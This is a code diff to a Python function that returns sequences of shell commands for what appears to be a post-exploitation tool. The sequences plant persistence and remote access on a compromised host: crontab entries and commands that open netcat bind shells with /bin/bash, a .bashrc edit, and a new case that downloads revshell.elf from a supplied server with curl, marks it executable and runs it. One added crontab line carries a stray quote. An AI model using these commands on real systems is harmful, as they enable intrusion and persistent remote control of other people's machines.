@@ -1,4 +1,4 @@
-
+from post.postexploit import openCtrlSrv
 
 def getsequence( id=0, srv=""):
     match id :
@@ -19,7 +19,7 @@ def getsequence( id=0, srv=""):
         case 2 :
             SEQUENCE = ["whoami",
               "cat /etc/crontab",
-              "sudo echo '10 14 * * *   vagrant     nc -l -p 55555 -e /bin/bash' >> /etc/crontab",
+              "(crontab -l ; echo '@reboot sleep 200 && nc -l -p 55555 -e /bin/bash')|crontab' >> /etc/crontab",
               "cat /etc/crontab"]
         case 3 :
             SEQUENCE = ["whoami",
@@ -52,4 +52,12 @@ def getsequence( id=0, srv=""):
               "chmod -R 700 .",
               "echo pwnguined",
               "nc -l -p 45678 -e /bin/bash"]
+        case 6 : 
+            SEQUENCE = ["whoami",
+                        "echo 'pwnguined' >> ~/.bashrc"]
+        case 7 :
+            SEQUENCE = ["whoami",
+                        "curl -s " + srv + "/post/revshell.elf -o revshell.elf > /dev/null",
+                        "chmod +x revshell.elf",
+                        "./revshell.elf"]
     return SEQUENCE
